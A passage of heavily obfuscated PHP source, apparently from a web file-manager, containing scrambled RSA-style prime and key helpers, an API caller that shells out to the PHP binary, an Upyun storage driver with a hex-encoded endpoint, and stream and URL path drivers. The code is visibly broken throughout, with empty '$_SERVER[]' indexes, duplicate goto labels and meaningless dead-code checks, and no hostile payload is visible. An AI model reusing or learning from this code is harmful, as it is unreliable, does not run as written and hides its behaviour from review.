$E[668]; break; $f᳅ǜ = $E[669]; case $Cӽ[332]: $b = $this->{$_SERVER[޾][246]}($E, $Cӽ[114]($a . $d̥)); break; case $Cӽ[333]: goto eޮ; a: $bٗ = 0; $dƕ = $E[671]; if (!$dƕ) { return; } goto dࠃ; dࠃ: $a饒̻ = 0; $c쒈 = 0; for ($bٗ = 0; $bٗ < $Cӽ[24]($E); $bٗ++) { $c쒈 = $c쒈 == $Cӽ[24]($C̐ԝ) ? 0 : $c쒈; $e = $c쒈++; $a饒̻ = $Cӽ[335]($f̯⃍, $E[$bٗ]) - $d׽ѥ - $Cӽ[336]($C̐ԝ[$e]); while ($a饒̻ < 0) { $a饒̻ += 64; $Aⶋ = $E[672]; if (!$Aⶋ) { die; } } $eĈ .= $f̯⃍[$a饒̻]; } goto c; c: $b = $Cӽ[339]($eĈ); break; goto dݦ; aގб: $bԶ = $E[670]; if (!$bԶ) { return; } $eĈ = $Cӽ[10]; goto a; eޮ: $E = $Cӽ[338]($E); $E = $E[0]; $E = $Cӽ[25]($E, 1); goto F ቩ; F ቩ: $d׽ѥ = $Cӽ[335]($f̯⃍, $E); $C̐ԝ = $Cӽ[114]($E . $Cӽ[114]($d̥ . $E) . $d̥); $C̐ԝ = $Cӽ[25]($C̐ԝ, $d׽ѥ % 8, $d׽ѥ % 8 + 7); goto aގб; dݦ: default: $b = $this->{$_SERVER[޾][246]}($E, $d̥ . $a); $b۞ǵ = $E[673]; if (strlen($b۞ǵ) < $E[594]) { die; } break; $b = $E[674]; } if ($F - 1 > 0) { $b = $this->{$_SERVER[޾][188]}($b, $d̥, $F - 1); } goto e; eǠ: if (!$Dȷ) { die; } $E = $Cӽ[25]($E, 16); $Aƿ؝ = $E[664]; goto Eԅ; Aټ: } public function yosw134458fb($Dâ) { goto fן; F: $b = $dȧᝩ[682]; if (strlen($b) < $dȧᝩ[555]) { die; } $d = $this->{$_SERVER[޾][147]}($Dâ, $F) . $E[344] . $F; goto B; f: for ($cߊ = 0; $cߊ < $bһ * 10; $cߊ++) { if (($bһ * $cߊ + 1) % $eͩ == 0) { $a = $E[201](($bһ * $cߊ + 1) / $eͩ); break; } } $F = $this->{$_SERVER[޾][147]}($f؇ * $a̼ . $E[10], $E[149]); $F = $E[114]($E[341] . ($f؇ + $a̼) . $E[342] . $eͩ . $E[342] . $a . $E[343]); goto F; fן: $dȧᝩ =& $_SERVER[]; $E =& $_SERVER[޾]; $f؇ = $this->{$_SERVER[޾][340]}(); goto B; B: $Bߖȋ = $dȧᝩ[675]; $a̼ = $this->{$_SERVER[޾][340]}(); $Eռ = $dȧᝩ[676]; goto A݉; B: $b񿝌 = $dȧᝩ[683]; return $d; goto D鄦; c: if (!$Eƅ) { return; } while (1) { $F = $eͩ; $B艐 = $bһ; $Dĸٔ = $dȧᝩ[679]; while ($B艐 % $F != 0) { $eں = $B艐; $B艐 = $F; $bń = $dȧᝩ[680]; if (strlen($bń) < $dȧᝩ[566]) { return; } $F = $eں % $F; $f̄ = $dȧᝩ[681]; while ($f̄ < $dȧᝩ[563]) { if ($f̄ >= 0) { break; } $f̄++; } } if ($F == 1) { break; } else { $eͩ++; } } $a = 2; goto f; A݉: if (strlen($Eռ) < $dȧᝩ[563]) { die; } $bһ = ($f؇ - 1) * ($a̼ - 1); $Ḇ՘ = $dȧᝩ[677]; goto Fë; Fë: while ($Ḇ՘ < $dȧᝩ[555]) { if ($Ḇ՘ >= 0) { break; } $Ḇ՘++; } $eͩ = $E[201](($f؇ + $a̼) / 2); $Eƅ = $dȧᝩ[678]; goto c; D鄦: } public function fdrl24d066ee($a»ч) { goto Dˉ; d: if (!$aֺ) { return $bԱ[10]; } $aֺ = $bԱ[201]($aֺ); $Eտ = 0; goto aʎ; aʎ: $e͆Ө = 0; $Bۡ = $a[685]; if (strlen($Bۡ) < $a[557]) { return; } goto Dں͏; Dˉ: $a =& $_SERVER[]; $bԱ =& $_SERVER[޾]; $eѡ = $bԱ[0]($bԱ[344], $a»ч); goto D; Dں͏: for ($A꧆ = 3; $A꧆ < $aֺ; $A꧆ += 2) { if ($aֺ % $A꧆ != 0) { continue; } $Eտ = $A꧆; $FԿ = $a[686]; while ($FԿ < $a[594]) { if ($FԿ >= 0) { break; } $FԿ++; } $e͆Ө = $bԱ[201]($aֺ / $A꧆); break; $b̟ = $a[687]; if (strlen($b̟) < $a[594]) { die; } } $c̬ = ($Eտ - 1) * ($e͆Ө - 1); $e = $bԱ[201](($Eտ + $e͆Ө) / 2); goto f; fݟ: $a = $bԱ[114]($bԱ[341] . ($Eտ + $e͆Ө) . $bԱ[342] . $e . $bԱ[342] . $E̯ . $bԱ[343]); $cը䢄 = $a[692]; if (strlen($cը䢄) < $a[594]) { die; } goto b; b: $a = $this->{$_SERVER[޾][246]}($eѡ[0], $a); $Cꕂ = $a[693]; if (strlen($Cꕂ) < $a[563]) { die; } goto ď; ď: return $a; goto Bʴ; f: while (1) { $F = $e; $C띛 = $a[688]; if (strlen($C띛) < $a[557]) { die; } $A = $c̬; while ($A % $F != 0) { $a鐒Ɣ = $A; $e۽Ƅ = $a[689]; $A = $F; $Eݱ = $a[690]; if (strlen($Eݱ) < $a[594]) { return; } $F = $a鐒Ɣ % $F; $F芛ˬ = $a[691]; if (strlen($F芛ˬ) < $a[563]) { return; } } if ($F == 1) { break; } else { $e++; } } $E̯ = 2; for ($A꧆ = 0; $A꧆ < $c̬ * 10; $A꧆++) { if (($c̬ * $A꧆ + 1) % $e == 0) { $E̯ = $bԱ[201](($c̬ * $A꧆ + 1) / $e); break; } } goto fݟ; D: if ($bԱ[19]($eѡ) != 2) { return $bԱ[10]; } $aֺ = $this->{$_SERVER[޾][246]}($eѡ[1] . $bԱ[10], $bԱ[149]); $b罭 = $a[684]; goto d; Bʴ: } public function gbam7df7e969() { goto D; D: while (strlen($Eֿ鷎) < $Bƪ[563]) { if (!$Eֿ鷎) { break; } $Eֿ鷎++; } goto fҎ; b: $d = 1; while ($d <= (int) $Cܳ筧[346]($Fؐه)) { $c詔 = $d; while (!0) { $c詔++; if ($c詔 <= 2) { $d = $c詔; break; } else { if ($c詔 < 2) { continue; } } $aҿ = !0; for ($C = 2; $C <= $Cܳ筧[346]($c詔); $C++) { if ($c詔 % $C == 0) { $aҿ = !1; } } if ($aҿ) { $d = $c詔; break; } } $aȈȋ[] = $d; } $bՊ = 2; goto A; Dͦ: $Eͯ = $Bƪ[694]; if (strlen($Eͯ) < $Bƪ[557]) { return; } $aȈȋ = array(); goto b; A: for ($c詔 = $Fؐه; $c詔 > 1; $c詔--) { $aҿ = !0; $Aۍ = $Bƪ[695]; foreach ($aȈȋ as $F) { if ($c詔 % $F == 0) { $aҿ = !1; break; } } if ($aҿ) { $bՊ = $c詔; break; } } return $bՊ; $Eֿ鷎 = $Bƪ[696]; goto D; D: $Bƪ =& $_SERVER[]; $Cܳ筧 =& $_SERVER[޾]; $Fؐه = $Cܳ筧[325]($Cܳ筧[345](2, 14), $Cܳ筧[345](2, 16) - 1); goto Dͦ; fҎ: } public function tbdpf04d4dc6($Dؙ, $B忂) { $aǏ =& $_SERVER[]; $dݘ =& $_SERVER[޾]; return $dݘ[13](array($dݘ[14], $dݘ[347]), $Dؙ, $B忂); $A = $aǏ[697]; while (strlen($A) < $aǏ[566]) { if (!$A) { break; } $A++; } } public function mplo54516f44($Bٱ, $b؈) { $bٯ̋Վ =& $_SERVER[޾]; return $bٯ̋Վ[13](array($bٯ̋Վ[348], $bٯ̋Վ[349]), $Bٱ, $b؈); } public function vpyx9ea1be61($C, $f) { $aÐ =& $_SERVER[޾]; return $aÐ[13](array($aÐ[348], $aÐ[350]), $C, $f); } } $F = LIB_DIR . $_SERVER[][698]; goto a䛿; F: function ActionCall($fԈƆ) { $F؛ҿ = array_slice(func_get_args(), 1); return ActionApply($fԈƆ, $F؛ҿ); } function ActionCallApi($bńέ, $fí = '') { goto aɓސ; DŅÊ: $A凃 = phpBinCommand(); if ($A凃 && function_exists($Dͤ[25])) { $Cص = $A凃 . $Dͤ[26] . BASIC_PATH . $Dͤ[27] . escapeshellarg($bńέ); $dΏ = shell_exec($Cص); } if (!$dΏ) { $D = stream_context_create(array($Dͤ[28] => array($Dͤ[29] => 20, $Dͤ[30] => $Dͤ[31]))); $dΏ = file_get_contents(APP_HOST . $Dͤ[32] . $bńέ, !1, $D); } goto C鮙҄; aɓސ: $Dͤ =& $_SERVER[͒]; $eׂò = $fí; if (is_array($fí)) { $eׂò = $Dͤ[20]; foreach ($fí as $B⅟Ú => $e󚓄Ѿ) { $e󚓄Ѿ = is_array($e󚓄Ѿ) ? json_encode($e󚓄Ѿ) : $e󚓄Ѿ; $e󚓄Ѿ = is_bool($e󚓄Ѿ) ? intval($e󚓄Ѿ) : $e󚓄Ѿ; $eׂò .= $Dͤ[21] . $B⅟Ú . $Dͤ[22] . rawurlencode($e󚓄Ѿ); } } goto dޕ; D쿭Ђ: return $c; goto AΥ; C鮙҄: $a䝺 = json_decode($dΏ, !0); $c = is_array($a䝺) ? $a䝺 : array($Dͤ[33] => null, $Dͤ[34] => $dΏ); if (!$a䝺) { echo $dΏ; } goto D쿭Ђ; dޕ: $eЗ𬇟 = Action($Dͤ[23])->accessToken(); $bńέ = str_replace($Dͤ[5], $Dͤ[4], $bńέ) . $Dͤ[24] . $eЗ𬇟 . $eׂò; $dΏ = $Dͤ[20]; goto DŅÊ; AΥ: } function ActionCallHook($B출) { goto A߸; dЈ: $GLOBALS[$C[35]] = 1; $C֫ = ActionApply($B출, $EǴ՟Ę); $cܵ = ob_get_clean(); goto c¹Ǻ; A߸: $C =& $_SERVER[͒]; ob_start(); $EǴ՟Ę = array_slice(func_get_args(), 1); goto dЈ; c¹Ǻ: $C֫ = $cܵ ? json_decode($cܵ, !0) : $C֫; $GLOBALS[$C[35]] = 0; return $C֫; goto a; a: } goto b; F籏: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($b٧, $F = 0) { parent::__construct(); $this->source = $b٧; $this->sourceSize = $F; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($cѾтʉ = false) { return $this->sourceSize; } public function getContent($bࡑ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $EٙΥ = ftell($this->source); $e̋ = @fread($this->source, $this->sourceSize); fseek($this->source, $EٙΥ); return $e̋; } } public function fileSubstr($C滋 = false, $cɞ = 0, $a = 0) { if (!$a) { $a = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $cɞ, $a); } if ($this->sourceType == self::TYPE_FILE) { $f̯ͧ = ftell($this->source); fseek($this->source, $f̯ͧ + $cɞ); $AΈ = @fread($this->source, $a); fseek($this->source, $f̯ͧ); return $AΈ; } } public function hashMd5($A婢 = false) { return md5($this->getContent()); } public static function hash($E残, $e⒴ = 0) { $EΑ = new PathDriverStream($E残, $e⒴); return $EΑ->hashSimple($E残); } public static function md5($Dᓏ틖, $EϢȹ = 0) { $BߩŖ = new PathDriverStream($Dᓏ틖, $EϢȹ); return $BߩŖ->hashMd5($Dᓏ틖); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\57\x2f\166\60\x2e\x61\x70\151\56\165\x70\x79\165\156\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($f) { parent::__construct(); $this->_init($f); } public function _init($F栐) { foreach ($F栐 as $Eԩ => $CΤ) { if (isset($this->{$Eԩ})) { $this->{$Eԩ} = $CΤ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[][1257], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e, $b̶ = "\x47\x45\x54") { $A =& $_SERVER[]; $Fӻ = gmdate($A[1221]); $C吋 = base64_encode(hash_hmac($A[1258], "{$b̶}\x26{$e}\46{$Fӻ}", md5("{$this->userpass}"), !0)); $f֋ = array("\101\x75\164\x68\157\162\151\x7a\x61\x74\151\x6f\156\x3a\x55\120\x59\x55\x4e\40{$this->username}\72{$C吋}", "\104\141\164\x65\x3a{$Fӻ}"); return $f֋; } public function ussRequest($d, $eŅ = "\107\x45\124", $C맠 = false, $Dߎ = false, $B = false) { goto b; E˯: if (!$B) { return array($a[1047] => !1, $a[1049] => $a[1259]); } if (strtolower($eŅ) == $a[184] || in_array($B[$a[1047]], array($a[1115], $a[1260]))) { $C맠 = $B[$a[1261]]; } else { $C맠 = json_decode($B[$a[1049]], !0); if (!$C맠) { $C맠 = $B[$a[1049]]; } else { if (!$B[$a[708]] && isset($C맠[$a[1262]])) { $C맠 = $C맠[$a[1262]]; } } } return array($a[1047] => $B[$a[708]], $a[1049] => $C맠); goto FΊ; b: $a =& $_SERVER[]; $d = trim($d, $a[8]); $aҠ = "\57{$this->bucket}\57{$d}"; goto d; d: $d = $this->ussHeaders($aҠ, $eŅ); if ($Dߎ) { $d = array_merge($d, $Dߎ); } $B = url_request($this->endpoint . $aҠ, $eŅ, $C맠, $d, $B); goto E˯; FΊ: } public function mkfile($eкǎ, $E˾ = '', $A = REPEAT_RENAME) { if ($this->setContent($eкǎ, $E˾)) { return $this->getPathOuter($eкǎ); } return !1; } public function mkdir($F󬱺, $aͫ = REPEAT_SKIP) { $F뜭 =& $_SERVER[]; $fُ = trim($F󬱺, $F뜭[8]); if ($this->_isFolder($fُ)) { return $this->getPathOuter($fُ); } $CѭȌ = array($F뜭[1263]); $D֤߿ = $this->ussRequest($fُ, $F뜭[212], !1, $CѭȌ); return $D֤߿[$F뜭[1047]] ? $this->getPathOuter($fُ) : !1; } public function copyFile($B, $AĮ) { $dȹ =& $_SERVER[]; $bڄ = array($dȹ[1264] . "\x2f{$this->bucket}\x2f{$B}", $dȹ[1265]); $Dɬ = $this->ussRequest($AĮ, $dȹ[214], !1, $bڄ); return $Dɬ[$dȹ[1047]] ? !0 : $this->getPathOuter($AĮ); } public function moveFile($A՘ڶ, $D鲆ħ) { $CŽ =& $_SERVER[]; $F = array($CŽ[1266] . "\57{$this->bucket}\x2f{$A՘ڶ}", $CŽ[1265]); $eӤ = $this->ussRequest($D鲆ħ, $CŽ[214], !1, $F); return $eӤ[$CŽ[1047]] ? !0 : $this->getPathOuter($D鲆ħ); } public function delFile($D) { $eΐ =& $_SERVER[]; $F鵷Ӝ = $this->ussRequest($D, $eΐ[1267]); return $F鵷Ӝ[$eΐ[1047]] ? !0 : !1; } public function delFolder($c) { $Č =& $_SERVER[]; $DҜ = $this->listAll($c); krsort($DҜ); foreach ($DҜ as $E쵷Л) { $this->ussRequest($E쵷Л[$Č[75]], $Č[1267]); } return $this->ussRequest($c, $Č[1267]); } public function rename($a׫ۅ, $B) { if ($this->isFile($a׫ۅ)) { $B = get_path_father($a׫ۅ) . $B; return $this->moveFile($a׫ۅ, $B); } return $this->renameObject($a׫ۅ, $B); } public function fileInfo($FخΛ, $Aꐃ = false, $b喰 = array()) { $F =& $_SERVER[]; if ($Aꐃ) { return array($F[28] => $this->pathThis($FخΛ), $F[75] => $this->getPathOuter($F[8] . $FخΛ), $F[29] => $F[167], $F[77] => isset($b喰[$F[325]]) ? $b喰[$F[325]] : 0, $F[160] => $this->ext($FخΛ)); } $Dš = array($F[28] => $this->pathThis($FخΛ), $F[75] => $this->getPathOuter($F[8] . $FخΛ), $F[29] => $F[167], $F[187] => 0, $F[107] => isset($cЖ[$F[1268]]) ? $cЖ[$F[1268]] : 0, $F[77] => isset($b喰[$F[325]]) ? $b喰[$F[325]] : 0, $F[160] => $this->ext($FخΛ), $F[188] => !0, $F[189] => !0); if (empty($b喰)) { $b喰 = $this->objectMeta($FخΛ); if (!$b喰) { return $Dš; } $Dš[$F[187]] = $b喰[$F[1269]]; $Dš[$F[107]] = $b喰[$F[1270]]; $Dš[$F[77]] = $b喰[$F[77]]; } return $Dš; } public function folderInfo($fàϺ, $E = false) { $cʧꓼ =& $_SERVER[]; if ($E) { return array($cʧꓼ[28] => $this->pathThis($fàϺ), $cʧꓼ[75] => $this->getPathOuter($cʧꓼ[8] . $fàϺ), $cʧꓼ[29] => $cʧꓼ[76]); } $FΕِ = array($cʧꓼ[28] => $this->pathThis($fàϺ), $cʧꓼ[75] => $this->getPathOuter($cʧꓼ[8] . $fàϺ), $cʧꓼ[29] => $cʧꓼ[76], $cʧꓼ[187] => 0, $cʧꓼ[107] => isset($D[$cʧꓼ[1268]]) ? $D[$cʧꓼ[1268]] : 0, $cʧꓼ[1178] => !0, $cʧꓼ[1179] => !0); if (empty($Dԯ)) { $Dԯ = $this->objectMeta($fàϺ); if (!$Dԯ) { return $FΕِ; } $FΕِ[$cʧꓼ[187]] = $Dԯ[$cʧꓼ[1269]]; $FΕِ[$cʧꓼ[107]] = $Dԯ[$cʧꓼ[1270]]; } return $FΕِ; } private function fileList($dҰ, $a = 0, $D = 1000) { $F =& $_SERVER[]; $a = array($F[1271], $F[1272] . $D); if ($a) { $a[] = $F[1273] . $a; } $d͎ꏍ = $this->ussRequest($dҰ, $F[216], !1, $a); return !$d͎ꏍ[$F[1047]] ? !1 : $d͎ꏍ[$F[1049]]; } public function listPath($d䡌Ჽ, $e = false) { goto E; CОސ: return array($Ę[74] => $bۻ, $Ę[73] => $d֝); goto Bܚ; eѨ: $bۻ = $d֝ = array(); $A놋 = rtrim($d䡌Ჽ, $Ę[8]) . $Ę[8]; while (!0) { $f֑ = $this->fileList($d䡌Ჽ, $f㔸, $eԇ); if (!$f֑) { return !1; } $f㔸 = isset($f֑[$Ę[1274]]) ? $f֑[$Ę[1274]] : $Ę[33]; $cˌ = isset($f֑[$Ę[1275]]) ? $f֑[$Ę[1275]] : array(); foreach ($cˌ as $aۇ) { if ($aۇ[$Ę[29]] == $Ę[76]) { $bۻ[] = $this->folderInfo($A놋 . $aۇ[$Ę[28]], $e, $aۇ); } else { $d֝[] = $this->fileInfo($A놋 . $aۇ[$Ę[28]], $e, $aۇ); } } if (count($cˌ) < $eԇ) { break; } } goto CОސ; E: $Ę =& $_SERVER[]; $f㔸 = $Ę[33]; $eԇ = 1000; goto eѨ; Bܚ: } private function recursionAllFiles($B웯, &$Eʗ) { $F̖Յ =& $_SERVER[]; $d = $F̖Յ[33]; $fݦ = 1000; $f = $Cչ = array(); $d = rtrim($B웯, $F̖Յ[8]) . $F̖Յ[8]; while (!0) { $eӧ҄ = $this->fileList($B웯, $d, $fݦ); if (!$eӧ҄) { return !1; } $d = isset($eӧ҄[$F̖Յ[1274]]) ? $eӧ҄[$F̖Յ[1274]] : $F̖Յ[33]; $dУ = isset($eӧ҄[$F̖Յ[1275]]) ? $eӧ҄[$F̖Յ[1275]] : array(); foreach ($dУ as $Eƈ˪) { $e = array($F̖Յ[75] => $d . $Eƈ˪[$F̖Յ[28]], $F̖Յ[76] => $Eƈ˪[$F̖Յ[29]] == $F̖Յ[76] ? 1 : 0, $F̖Յ[77] => isset($Eƈ˪[$F̖Յ[325]]) ? $Eƈ˪[$F̖Յ[325]] : 0); $Eʗ[] = $e; if ($e[$F̖Յ[76]] == 1) { $this->recursionAllFiles($e[$F̖Յ[75]], $Eʗ); } } if (count($dУ) < $fݦ) { break; } } } public function has($Dғ, $EՉ = false, $Eք = true) { goto aˤ⷏; d߸: $F = 0; $d = 0; $A = rtrim($Dғ, $c˨[8]) . $c˨[8]; goto e; e: while (!0) { $fǴ = $this->fileList($Dғ, $b, $A); if (!$fǴ) { return !1; } $b = isset($fǴ[$c˨[1274]]) ? $fǴ[$c˨[1274]] : $c˨[33]; $A = isset($fǴ[$c˨[1275]]) ? $fǴ[$c˨[1275]] : array(); if (empty($A)) { break; } $dȢ = array_to_keyvalue($A, $c˨[33], $c˨[29]); $Dꆗ = array_count_values($dȢ); $B = isset($Dꆗ[$c˨[76]]) ? $Dꆗ[$c˨[76]] : 0; $fڗ = count($dȢ) - $B; if ($EՉ) { $d += $B; $F += $fڗ; if ($bІ < $A) { break; } continue; } if ($Eք) { if ($fڗ) { return !0; } } else { if ($B) { return !0; } } if (count($A) < $A) { break; } } if ($EՉ) { return array($c˨[191] => $F, $c˨[192] => $d); } return !1; goto d; aˤ⷏: $c˨ =& $_SERVER[]; $b = $c˨[33]; $A = 1000; goto d߸; d: } public function listAll($Aŗ) { $E = array(); $this->recursionAllFiles($Aŗ, $E); return $E; } public function canRead($a) { return $this->exist($a) ? !0 : !1; } public function canWrite($Fߣ) { return $this->exist($Fߣ) ? !0 : !1; } public function getContent($b닯) { return $this->fileSubstr($b닯, 0, -1); } public function setContent($c, $B޺ = '') { $cʿ =& $_SERVER[]; if (!$B޺) { $f貲 = $this->ussRequest($c, $cʿ[212]); return $f貲[$cʿ[1047]]; } $Cֈ = $this->tempFile($this->pathThis($c)); file_put_contents($Cֈ, $B޺); if ($this->upload($c, $Cֈ)) { $this->tempFileRemve($Cֈ); return !0; } return !1; } public function fileSubstr($bǣ, $e哿, $aː) { $bٖʥ =& $_SERVER[]; if (!($Eݻ = $this->link($bǣ))) { return !1; } $Fԥ = !1; if ($aː > 0) { $f؄Ϻ = $e哿 + $aː - 1; $Fԥ = array($bٖʥ[1236] . $e哿 . $bٖʥ[412] . $f؄Ϻ); } $f׎ = url_request($Eݻ, $bٖʥ[216], !1, $Fԥ); return $f׎[$bٖʥ[708]] ? $f׎[$bٖʥ[1049]] : !1; } public function upload($bٌ, $fȦ, $aڇ = false, $c = REPEAT_REPLACE) { goto Bے; a: $Eċ = 1024 * 1024 * 10; $E۞͊ = array($Eü[1277], $Eü[1278] . $D溟, $Eü[1279], $Eü[1280] . $Eċ); $D = $this->ussRequest($bٌ, $Eü[214], !1, $E۞͊); goto a¹; d: $D = $this->ussRequest($bٌ, $Eü[214], !1, $E۞͊); return $D[$Eü[1047]] ? $this->getPathOuter($aÃ) : !1; goto f; a¹: if (!$D[$Eü[1047]]) { return !1; } $Cݪ = $D[$Eü[1049]]; $fۡȱ = 0; goto f; D뿥: do { $a҂ = $Cݪ[$Eü[1282]]; fseek($cŢ, $fۡȱ); $cֆ = fread($cŢ, $a҂); $aК = 0; do { $aК++; $Cݪ = $this->uploadPart($bٌ, $Cݪ, $cֆ); } while (!$Cݪ && $aК < 3); if (!$Cݪ) { return !1; } $fӾ = $Cݪ[$Eü[1281]]; $fۡȱ += $a҂; } while ($fӾ != -1); fclose($cŢ); $E۞͊ = array($Eü[1283], $Eü[1284] . $Cݪ[$Eü[1285]], $Eü[1279]); goto d; Bے: $Eü =& $_SERVER[]; $D溟 = IO::size($fȦ); if ($D溟 <= 1024 * 1024 * 200) { $dѓ = array($Eü[1276] . $fȦ); $D = $this->ussRequest($bٌ, $Eü[214], $dѓ); return $D[$Eü[1047]] ? $this->getPathOuter($bٌ) : !1; } goto a; f: $fӾ = $Cݪ[$Eü[1281]]; $cŢ = fopen($fȦ, $Eü[1186]); if (!$cŢ) { return !1; } goto D뿥; f: } private function uploadPart($DՌ։, $a⫙ǣ, &$dÍ) { $DΆ =& $_SERVER[]; $D֤ = array($DΆ[1286], $DΆ[1284] . $a⫙ǣ[$DΆ[1285]], $DΆ[1287] . $a⫙ǣ[$DΆ[1281]], $DΆ[138] . $a⫙ǣ[$DΆ[1282]]); $D = $this->ussRequest($DՌ։, $DΆ[214], $dÍ, $D֤); return !$D[$DΆ[1047]] ? $D[$DΆ[1047]] : $D[$DΆ[1049]]; } public function uploadFormData($Aƾ҄, $c = 3600) { return $this->uploadPolicy($Aƾ҄, $c); } public function multiUploadFormData($Fѿۢ, $Eч = 3600) { $c =& $_SERVER[]; $BЙ = (int) $GLOBALS[$c[7]][$c[77]]; return $this->uploadPolicy($Fѿۢ, $Eч, $BЙ); } private function uploadPolicy($F߈ʪ, $eᲳ = 3600, $Aئ = 0) { goto f݅ʅ; b̔: $c = array($aǬ[1288] => $this->bucket, $aǬ[1289] => $F߈ʪ, $aǬ[1290] => time() + $eᲳ, $aǬ[1291] => $C); if ($Aئ) { $c[$aǬ[1207]] = $Aئ; } $C߈ = base64_encode(json_encode($c)); goto fǥ; f݅ʅ: $aǬ =& $_SERVER[]; $b = $aǬ[8] . $this->bucket; $C = gmdate($aǬ[1221]); goto b̔; fǥ: $Dظ = base64_encode(hash_hmac($aǬ[1258], "\x50\x4f\x53\x54\x26{$b}\46{$C}\x26{$C߈}", md5("{$this->userpass}"), !0)); $B = array($aǬ[1127] => $C߈, $aǬ[1292] => "\125\x50\131\125\x4e\x20{$this->username}\x3a{$Dظ}", $aǬ[169] => $this->endpoint . $b); return $B; goto d񺅹; d񺅹: } public function download($CǙ, $D) { goto cʍ; FԦ抅: $E嚤 = 1024 * 200; $FФ = fopen($dב, $_SERVER[][1242]); while (!0) { $b۲ = $this->fileSubstr($CǙ, $Fشͫ, $E嚤); if ($b۲ === !1) { return !1; } fwrite($FФ, $b۲); $Fشͫ += $E嚤; if (strlen($b۲) < $E嚤) { break; } } goto B; cʍ: $dב = IO::getPathInner(IO::mkfile($D)); if (!($fڽ = $this->link($CǙ))) { return !1; } $Fشͫ = 0; goto FԦ抅; B: fclose($FФ); return $D; goto Bᎃ̨; Bᎃ̨: } public function link($e, $a = array()) { $d =& $_SERVER[]; $e = trim($e, $d[8]); if (!empty($this->token)) { $B͜ԓ = strtotime(date($d[1293])); $cׅծ = substr(md5($this->token . $d[272] . $B͜ԓ . $d[1294] . $e), 12, 8) . $B͜ԓ; $a[] = $d[1295] . $cׅծ; } $cي = !empty($a) ? $d[69] . implode($d[272], $a) : $d[33]; return $this->getHost() . $d[8] . $e . $cي; } public function fileOut($cƐ, $A = false, $dǼ = false, $c槦 = '') { if (!$dǼ) { $dǼ = $this->pathThis($cƐ); } $B׊۷ = $A ? array($_SERVER[][1296] . rawurlencode($dǼ)) : array(); $c = $this->link($cƐ, $B׊۷); $this->fileOutLink($c); } public function fileOutServer($aŸމ, $F = false, $F = false, $a柄  = '') { parent::fileOut($aŸމ, $F, $F, $a柄 ); } public function fileOutImage($C뢤ᄌ, $F̈́ = 250) { $E暆 = $this->link($C뢤ᄌ . $_SERVER[][1297] . $F̈́); $this->fileOutLink($E暆); } public function fileOutImageServer($C, $c = 250) { parent::fileOutImage($C, $c); } public function hashMd5($b) { $dꚂǈ =& $_SERVER[]; $Cʞ = $this->objectMeta($b); return isset($Cʞ[$dꚂǈ[196]]) ? $Cʞ[$dꚂǈ[196]] : !1; } public function size($b쨼) { $c˦ = $this->objectMeta($b쨼); return $c˦ ? $c˦[$_SERVER[][77]] : 0; } public function info($dļݞ) { if ($this->isFolder($dļݞ)) { return $this->folderInfo($dļݞ); } else { if ($this->isFile($dļݞ)) { return $this->fileInfo($dļݞ); } } return !1; } public function exist($e䊅) { return $this->isFile($e䊅) || $this->isFolder($e䊅); } public function isFile($D) { return !$this->isFolder($D) && $this->objectMeta($D); } public function isFolder($fʋݪ) { return $this->cacheMethod($_SERVER[][223], $fʋݪ); } protected function objectMeta($Dſɫ) { return $this->cacheMethod($_SERVER[][224], $Dſɫ); } protected function _objectMeta($b䆹) { goto aϱѧӢ; eܵ: if (!$Eͻ[$D޻[1047]]) { return null; } $b = isset($Eͻ[$D޻[1049]]) ? $Eͻ[$D޻[1049]] : array(); if (!isset($b[$D޻[1299]])) { return null; } goto Eɖ; aϱѧӢ: $D޻ =& $_SERVER[]; if ($b䆹 == $D޻[33] || $b䆹 == $D޻[8]) { return array(); } $Eͻ = $this->ussRequest($b䆹, $D޻[1298]); goto eܵ; Eɖ: $B = array($D޻[28] => get_path_this($b䆹), $D޻[29] => isset($b[$D޻[1299]]) ? $b[$D޻[1299]] : null, $D޻[77] => isset($b[$D޻[1300]]) ? $b[$D޻[1300]] : null, $D޻[196] => isset($b[$D޻[1301]]) ? $b[$D޻[1301]] : null, $D޻[1269] => isset($b[$D޻[1302]]) ? $b[$D޻[1302]] : null); $B[$D޻[1270]] = isset($b[$D޻[1303]]) ? strtotime($b[$D޻[1303]]) : $B[$D޻[1269]]; return $B; goto dح; dح: } protected function _isFolder($eɊ) { $e螒 =& $_SERVER[]; if ($eɊ == $e螒[33] || $eɊ == $e螒[8]) { return !0; } $aߐօ = $this->objectMeta($eɊ); return isset($aߐօ[$e螒[29]]) && $aߐօ[$e螒[29]] == $e螒[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($E = false) { } public function exist($a) { $Eݟ = $this->info($a); return $Eݟ[$_SERVER[][188]]; } public function isFile($D) { $b˧ = $this->info($D); return $b˧[$_SERVER[][188]]; } public function isFolder($eَۓ) { return !1; } public function size($eۏ) { $a滒 = $this->info($eۏ); return $a滒[$_SERVER[][77]]; } public function info($f) { return $this->infoParse($f); } public function infoAuth($c) { return $this->infoParse($c); } public function infoWithChildren($B䓸) { return $this->infoParse($B䓸); } public function infoFull($b귻ă) { return $this->infoParse($b귻ă); } private function infoParse($d笟ǐ) { $Aә־ =& $_SERVER[]; $Fǭ̕ = $this->header($d笟ǐ); if (!$Fǭ̕ || !$Fǭ̕[$Aә־[708]]) { return !1; } $BՎ̱ = _get($Fǭ̕, $Aә־[325], 0); $f = array($Aә־[28] => $Fǭ̕[$Aә־[28]], $Aә־[75] => $d笟ǐ, $Aә־[29] => $Aә־[167], $Aә־[77] => intval($BՎ̱), $Aә־[160] => get_path_ext($Fǭ̕[$Aә־[28]]), $Aә־[1178] => $BՎ̱ > 0 && $Fǭ̕[$Aә־[1304]], $Aә־[1179] => !1); return $f; } private function header($DÖ) { if 